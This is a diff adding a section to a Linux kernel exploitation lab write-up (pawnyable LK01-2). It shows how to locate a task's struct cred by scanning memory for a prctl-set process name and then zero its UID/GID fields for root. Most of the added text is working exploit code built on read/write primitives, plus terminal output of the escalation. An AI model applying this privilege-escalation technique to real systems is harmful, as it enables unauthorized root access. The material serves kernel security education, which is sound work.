@@ -469,3 +469,158 @@ system("/tmp/pwn"); // call modprobe_path
 ~~~
 
 See: [src/05.heapbof-aaw/heapbof-aaw.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/05.heapbof-aaw/heapbof-aaw.c)
+
+## struct cred
+
+A pointer to `struct cred` is found within the `task_struct`:
+
+~~~c
+ 727  struct task_struct {
+...
+1040    /* Process credentials: */
+1041  
+1042    /* Tracer's credentials at attach: */
+1043    const struct cred __rcu     *ptracer_cred;
+1044  
+1045    /* Objective and real subjective task credentials (COW): */
+1046    const struct cred __rcu     *real_cred;
+1047  
+1048    /* Effective (overridable) subjective task credentials (COW): */
+1049    const struct cred __rcu     *cred;
+1050  
+1051  #ifdef CONFIG_KEYS
+1052    /* Cached requested key. */
+1053    struct key          *cached_requested_key;
+1054  #endif
+1055  
+1056    /*
+1057     * executable name, excluding path.
+1058     *
+1059     * - normally initialized setup_new_exec()
+1060     * - access it with [gs]et_task_comm()
+1061     * - lock it with task_lock()
+1062     */
+1063    char                comm[TASK_COMM_LEN];
+~~~
+
+`->comm` is a 16 byte string storing the executable's name.  This value can be
+changed using prctl(2) with option PR_SET_NAME. 
+
+In order to find `cred`, the exploit sets `comm` with a string that is unlikely
+to exist in the kernel and searches for it using AAR. `cred` will 8 bytes
+before in memory.
+
+~~~c
+unsigned int AAR32(unsigned long addr) {
+  if (cache_fd == -1) {
+    unsigned long *p = (unsigned long*)&buf;
+    p[12] = rop_mov_eax_prdx;
+    *(unsigned long*)&buf[0x418] = g_buf;
+    write(fd, buf, 0x420);
+  }
+
+  // mov eax, [rdx]; ret;
+  if (cache_fd == -1) {
+    for (int i = 0; i < 100; i++) {
+      int v = ioctl(spray[i], 0, addr /* rdx */);
+      if (v != -1) {
+        cache_fd = spray[i];
+        return v;
+      }
+    }
+  } else {
+    return ioctl(cache_fd, 0, addr /* rdx */);
+  }
+}
+
+int main() { // task_structの探索
+...
+  if (prctl(PR_SET_NAME, "nekomaru") != 0)
+    fatal("prctl");
+  unsigned long addr;
+  for (addr = g_buf - 0x1000000; ; addr += 0x8) {
+    if ((addr & 0xfffff) == 0)
+      printf("searching... 0x%016lx\n", addr);
+  
+    if (AAR32(addr) == 0x6f6b656e
+        && AAR32(addr+4) == 0x7572616d) {
+      printf("[+] Found 'comm' at 0x%016lx\n", addr);
+      break;
+    }
+  }
+~~~
+
+### Escalating privileges
+
+~~~c
+File: include/linux/cred.h
+
+110  struct cred {
+111  	atomic_t	usage;
+112  #ifdef CONFIG_DEBUG_CREDENTIALS
+113  	atomic_t	subscribers;	/* number of processes subscribed */
+114  	void		*put_addr;
+115  	unsigned	magic;
+116  #define CRED_MAGIC	0x43736564
+117  #define CRED_MAGIC_DEAD	0x44656144
+118  #endif
+119  	kuid_t		uid;		/* real UID of the task */
+120  	kgid_t		gid;		/* real GID of the task */
+121  	kuid_t		suid;		/* saved UID of the task */
+122  	kgid_t		sgid;		/* saved GID of the task */
+123  	kuid_t		euid;		/* effective UID of the task */
+124  	kgid_t		egid;		/* effective GID of the task */
+125  	kuid_t		fsuid;		/* UID for VFS ops */
+126  	kgid_t		fsgid;		/* GID for VFS ops */
+127  	unsigned	securebits;	/* SUID-less security management */
+128  	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+129  	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+130  	kernel_cap_t	cap_effective;	/* caps we can actually use */
+131  	kernel_cap_t	cap_bset;	/* capability bounding set */
+132  	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+133  #ifdef CONFIG_KEYS
+134  	unsigned char	jit_keyring;	/* default keyring to attach requested
+~~~
+
+~~~c
+  unsigned long addr_cred = 0;
+  addr_cred |= AAR32(addr - 8);
+  addr_cred |= (unsigned long)AAR32(addr - 4) << 32;
+  printf("[+] current->cred = 0x%016lx\n", addr_cred);
+
+  // 実効IDの上書き
+  for (int i = 1; i < 9; i++) {
+    AAW32(addr_cred + i*4, 0); // id=0(root)
+  }
+
+  puts("[+] pwned!");
+  system("/bin/sh");
+~~~
+
+~~~sh
+/ $ id
+uid=1337 gid=1337 groups=1337
+$ ./heapbof-cred
+[+] kbase = 0xffffffff81000000
+[+] g_buf = 0xffff8880030f7800
+searching... 0xffff888002100000
+searching... 0xffff888002200000
+searching... 0xffff888002300000
+searching... 0xffff888002400000
+searching... 0xffff888002500000
+searching... 0xffff888002600000
+searching... 0xffff888002700000
+searching... 0xffff888002800000
+searching... 0xffff888002900000
+searching... 0xffff888002a00000
+searching... 0xffff888002b00000
+searching... 0xffff888002c00000
+searching... 0xffff888002d00000
+[+] Found 'comm' at 0xffff888002deca90
+[+] current->cred = 0xffff888002f74d80
+[+] pwned!
+/ # id
+uid=0(root) gid=0(root) groups=1337
+~~~
+
+See: [src/06.heapbof-cred/heapbof-cred.c](https://github.com/cpey/pawnyable/blob/main/LK01-2/src/06.heapbof-cred/heapbof-cred.c)
